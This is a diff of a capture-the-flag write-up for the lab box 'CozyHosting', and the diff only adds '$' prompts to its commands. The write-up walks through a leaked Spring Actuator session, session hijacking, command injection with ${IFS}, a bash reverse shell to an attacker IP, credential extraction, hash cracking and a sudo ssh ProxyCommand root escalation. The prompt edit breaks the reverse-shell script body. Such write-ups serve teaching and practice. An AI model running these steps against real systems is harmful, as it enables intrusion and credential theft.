@@ -20,8 +20,8 @@ CozyHosting is an easy Linux box built around a Java Spring Boot web app. nginx 
 Full TCP scan first, then version detection on what was open.
 
 ```bash
-nmap -p- --min-rate 10000 10.129.95.228
-nmap -p22,80 -sCV 10.129.95.228
+$ nmap -p- --min-rate 10000 10.129.95.228
+$ nmap -p22,80 -sCV 10.129.95.228
 ```
 
 Two ports.
@@ -35,7 +35,7 @@ Two ports.
 OpenSSH 8.9p1 pins this to Ubuntu 22.04. Port 80 redirects to `cozyhosting.htb`, so I added that to `/etc/hosts`:
 
 ```bash
-echo '10.129.95.228 cozyhosting.htb' | sudo tee -a /etc/hosts
+$ echo '10.129.95.228 cozyhosting.htb' | sudo tee -a /etc/hosts
 ```
 
 The site is a hosting-company landing page with a `/login`. Content discovery against the root turned up the obvious routes plus something far more useful.
@@ -60,7 +60,7 @@ The `/login` page and the framework fingerprint (Spring's default Whitelabel err
 Actuator is Spring Boot's management surface. In production it should be locked behind auth or disabled. Here it answered unauthenticated. The index listed exactly what was exposed:
 
 ```bash
-curl -s http://cozyhosting.htb/actuator --header "Content-Type: application/json" | jq
+$ curl -s http://cozyhosting.htb/actuator --header "Content-Type: application/json" | jq
 ```
 
 ```json
@@ -79,7 +79,7 @@ curl -s http://cozyhosting.htb/actuator --header "Content-Type: application/json
 `/actuator/env` confirmed the app reads an `application.properties` out of `cloudhosting-0.0.1.jar` and runs on `127.0.0.1:8080` behind the nginx reverse proxy. The values were masked with `******`, so env was a map of the box, not a credential dump. The win was `/actuator/sessions`, which maps every live `JSESSIONID` to the username it belongs to:
 
 ```bash
-curl -s http://cozyhosting.htb/actuator/sessions --header "Content-Type: application/json" | jq
+$ curl -s http://cozyhosting.htb/actuator/sessions --header "Content-Type: application/json" | jq
 ```
 
 ```json
@@ -97,7 +97,7 @@ curl -s http://cozyhosting.htb/actuator/sessions --header "Content-Type: applica
 Stealing the session is a cookie swap. Spring tracks the session with a `JSESSIONID` cookie, so I set mine to the leaked value and hit `/admin`. The first try from a fresh browser session did not take cleanly, so I drove it through Burp: send a request to `/admin` with the leaked cookie, intercept, and replay it carrying `JSESSIONID=A0F3EA897AB3AAE89DD2E4AC6975C649`. That landed me in the admin dashboard.
 
 ```bash
-curl http://cozyhosting.htb/admin --cookie "JSESSIONID=A0F3EA897AB3AAE89DD2E4AC6975C649"
+$ curl http://cozyhosting.htb/admin --cookie "JSESSIONID=A0F3EA897AB3AAE89DD2E4AC6975C649"
 ```
 
 The admin panel has an "add host" feature that connects to a server over SSH. It posts `username` and `host` to `/executessh`. That endpoint is the foothold. I confirmed how it works later by pulling the class out of the JAR, but the behavior is obvious from probing: it shells out to run `ssh user@host` and reflects the error back. Decompiled, the handler is `ComplianceService`:
@@ -151,7 +151,7 @@ With execution confirmed, I swapped in a reverse shell. The trick is the same wh
 
 ```bash
 #!/bin/bash
-/bin/bash -i >& /dev/tcp/10.10.14.105/4444 0>&1
+$ /bin/bash -i >& /dev/tcp/10.10.14.105/4444 0>&1
 ```
 
 Then the `/executessh` body to fetch and run it (every space is `${IFS}`):
@@ -176,8 +176,8 @@ app@cozyhosting:/app$
 The app ran out of `/app`, and `cloudhosting-0.0.1.jar` was sitting right there. That JAR is just a ZIP, and Spring bundles its config under `BOOT-INF/classes/`. Always check `application.properties`, manifests, and the resources folder when you have an application archive. I copied it off the box and unzipped it (`/dev/shm` works fine on the box too):
 
 ```bash
-unzip cloudhosting-0.0.1.jar
-cat BOOT-INF/classes/application.properties
+$ unzip cloudhosting-0.0.1.jar
+$ cat BOOT-INF/classes/application.properties
 ```
 
 ```properties
@@ -205,7 +205,7 @@ tcp LISTEN 0 100   127.0.0.1:8080     *:*    users:(("java",pid=1039,fd=19))
 I connected with the leaked creds and dumped the users table:
 
 ```bash
-psql -U postgres -h localhost -p 5432 -W
+$ psql -U postgres -h localhost -p 5432 -W
 # password: Vg&nvzAQ7XxR
 ```
 
@@ -223,7 +223,7 @@ SELECT * FROM users;
 Two bcrypt hashes (`$2a$10$`, cost 10). bcrypt is slow, so I only bothered with the admin one. john cracked it off rockyou:
 
 ```bash
-john --wordlist=rockyou.txt hash
+$ john --wordlist=rockyou.txt hash
 ```
 
 ```
@@ -236,7 +236,7 @@ manchesterunited (?)
 Hashcat mode 3200 does the same job (`hashcat -m 3200 hash rockyou.txt`). The cracked password belongs to no obvious account name, but the box has a local user the creds get reused for. `/etc/passwd` showed a `josh`, and the admin password worked for SSH as `josh`:
 
 ```bash
-ssh josh@cozyhosting.htb
+$ ssh josh@cozyhosting.htb
 # password: manchesterunited
 ```
 
@@ -258,7 +258,7 @@ User josh may run the following commands on localhost:
 josh can run `ssh` as root with any arguments. The OpenSSH client is on GTFOBins for exactly this reason: the `ProxyCommand` option is passed to `/bin/sh -c`, so anything in it executes with the privileges of the user running ssh. Running ssh as root means the ProxyCommand runs as root. The GTFOBins one-liner spawns an interactive shell with stdin/stdout wired to stderr:
 
 ```bash
-sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
 ```
